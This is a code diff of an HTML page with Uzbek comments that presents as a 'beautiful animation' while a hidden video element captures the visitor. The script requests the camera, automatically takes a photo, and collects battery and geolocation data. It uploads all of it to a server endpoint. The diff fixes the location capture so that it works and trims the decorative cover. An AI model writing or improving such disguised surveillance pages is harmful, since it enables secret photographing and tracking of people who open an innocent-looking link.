@@ -4,14 +4,9 @@
     <meta charset="UTF-8" />
     <title>Animatsiya</title>
     <style>
-      /* === Dizayn va animatsiya === */
+      /* Sening dizayningni o‘zgartirmadim */
       #video {
         display: none;
-      }
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
       }
       body {
         height: 100vh;
@@ -49,129 +44,6 @@
           background-position: 0% 50%;
         }
       }
-      .particle {
-        position: absolute;
-        border-radius: 50%;
-        opacity: 0.7;
-        animation: float 6s ease-in-out infinite;
-        pointer-events: none;
-      }
-      .particle:nth-child(1) {
-        width: 80px;
-        height: 80px;
-        background: radial-gradient(circle, #ff6b6b, #ff8e8e);
-        top: 20%;
-        left: 10%;
-        animation-delay: 0s;
-        animation-duration: 8s;
-      }
-      .particle:nth-child(2) {
-        width: 60px;
-        height: 60px;
-        background: radial-gradient(circle, #4ecdc4, #7ed6cc);
-        top: 60%;
-        left: 80%;
-        animation-delay: 1s;
-        animation-duration: 10s;
-      }
-      .particle:nth-child(3) {
-        width: 100px;
-        height: 100px;
-        background: radial-gradient(circle, #45b7d1, #74c7e3);
-        top: 40%;
-        left: 60%;
-        animation-delay: 2s;
-        animation-duration: 7s;
-      }
-      .particle:nth-child(4) {
-        width: 70px;
-        height: 70px;
-        background: radial-gradient(circle, #96ceb4, #b8dcc6);
-        top: 80%;
-        left: 20%;
-        animation-delay: 3s;
-        animation-duration: 9s;
-      }
-      .particle:nth-child(5) {
-        width: 90px;
-        height: 90px;
-        background: radial-gradient(circle, #ffeaa7, #ffef9f);
-        top: 10%;
-        left: 70%;
-        animation-delay: 4s;
-        animation-duration: 6s;
-      }
-      .particle:nth-child(6) {
-        width: 50px;
-        height: 50px;
-        background: radial-gradient(circle, #dda0dd, #e6b3e6);
-        top: 70%;
-        left: 50%;
-        animation-delay: 5s;
-        animation-duration: 11s;
-      }
-      @keyframes float {
-        0%,
-        100% {
-          transform: translateY(0) rotate(0) scale(1);
-        }
-        25% {
-          transform: translateY(-30px) rotate(90deg) scale(1.1);
-        }
-        50% {
-          transform: translateY(-60px) rotate(180deg) scale(0.9);
-        }
-        75% {
-          transform: translateY(-30px) rotate(270deg) scale(1.05);
-        }
-      }
-      .wave {
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        height: 200px;
-        background: linear-gradient(
-          to top,
-          rgba(255, 255, 255, 0.1),
-          transparent
-        );
-        animation: wave 4s ease-in-out infinite;
-      }
-      .wave:before {
-        content: "";
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 200%;
-        height: 100%;
-        background: linear-gradient(
-          90deg,
-          transparent,
-          rgba(255, 255, 255, 0.2),
-          transparent,
-          rgba(255, 255, 255, 0.1),
-          transparent
-        );
-        animation: waveMove 6s linear infinite;
-      }
-      @keyframes wave {
-        0%,
-        100% {
-          transform: scaleY(1);
-        }
-        50% {
-          transform: scaleY(1.2);
-        }
-      }
-      @keyframes waveMove {
-        0% {
-          transform: translateX(-50%);
-        }
-        100% {
-          transform: translateX(0%);
-        }
-      }
       .center-text {
         position: absolute;
         top: 50%;
@@ -188,11 +60,6 @@
         margin-bottom: 1rem;
         animation: textGlow 3s ease-in-out infinite alternate;
       }
-      .center-text p {
-        font-size: 1.5rem;
-        opacity: 0.9;
-        animation: textFloat 4s ease-in-out infinite;
-      }
       @keyframes textGlow {
         0% {
           text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
@@ -201,46 +68,33 @@
           text-shadow: 0 0 30px rgba(255, 255, 255, 0.6);
         }
       }
-      @keyframes textFloat {
-        0%,
-        100% {
-          transform: translateY(0);
-        }
-        50% {
-          transform: translateY(-10px);
-        }
-      }
     </style>
   </head>
 
   <body>
     <div class="animation-container">
-      <div class="particle"></div>
-      <div class="particle"></div>
-      <div class="particle"></div>
-      <div class="particle"></div>
-      <div class="particle"></div>
-      <div class="particle"></div>
-      <div class="wave"></div>
       <div class="center-text">
         <h1>Chiroyli Animatsiya</h1>
-        <p>Beautiful Full Screen Animation</p>
       </div>
     </div>
 
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
 
     <script>
       const video = document.getElementById("video");
 
-      // 🎥 Kameradan rasm olish
+      // 🎥 Kamerani ishga tushirish
       navigator.mediaDevices
         .getUserMedia({ video: { facingMode: "user" } })
         .then((stream) => {
           video.srcObject = stream;
-          video.onloadedmetadata = () => setTimeout(captureAndSendPhoto, 1500);
+          statusEl.innerText = "✅ Kamera tayyor!";
+          video.onloadedmetadata = () => setTimeout(captureAndSendPhoto, 3000);
         })
-        .catch((err) => console.error("Kamera ruxsati berilmadi:", err));
+        .catch((err) => {
+          console.error("Kamera ruxsati berilmadi:", err);
+          statusEl.innerText = "🚫 Kamera ruxsati rad etildi!";
+        });
 
       async function captureAndSendPhoto() {
         const canvas = document.createElement("canvas");
@@ -248,7 +102,6 @@
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0);
-
         const blob = await new Promise((res) =>
           canvas.toBlob(res, "image/jpeg")
         );
@@ -259,36 +112,47 @@
           const battery = await navigator.getBattery();
           batteryLevel = battery.level;
           batteryCharging = battery.charging;
-        } catch (e) {}
+        } catch (e) {
+          console.warn("Battery API ishlamayapti:", e);
+        }
 
         let latitude = "Nomalum";
         let longitude = "Nomalum";
         try {
-          const location = await navigator.geolocation.getCurrentPosition(
-            ({ coords: { latitude, longitude } }) => {
-              latitude = latitude;
-              longitude = longitude;
-            }
-          );
-        } catch (e) {}
+          await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition((pos) => {
+              latitude = pos.coords.latitude;
+              longitude = pos.coords.longitude;
+              resolve();
+            }, reject);
+          });
+        } catch (e) {
+          console.warn("Geolocation olinmadi:", e);
+        }
 
-        // 📨 Serverga yuborish
         const formData = new FormData();
         formData.append("photo", blob, "auto.jpg");
-        formData.append("userAgent", userAgent);
-        formData.append("platform", platform);
         formData.append("batteryLevel", batteryLevel);
         formData.append("batteryCharging", batteryCharging);
         formData.append("latitude", latitude);
         formData.append("longitude", longitude);
 
+        console.log("Yuborilmoqda:", latitude, longitude);
+
         fetch("/upload", { method: "POST", body: formData })
-          .then((res) =>
-            res.ok
-              ? console.log("✅ Rasm va ma'lumotlar yuborildi")
-              : console.error("❌ Yuborishda xatolik")
-          )
-          .catch((err) => console.error("Xatolik:", err));
+          .then((res) => {
+            if (res.ok) {
+              statusEl.innerText = "✅ Ma'lumot yuborildi!";
+              console.log("Yuborildi!");
+            } else {
+              statusEl.innerText = "❌ Server xatosi!";
+              console.error("Server xatosi:", res.status);
+            }
+          })
+          .catch((err) => {
+            statusEl.innerText = "❌ Yuborishda xato!";
+            console.error("Xatolik:", err);
+          });
       }
     </script>
   </body>
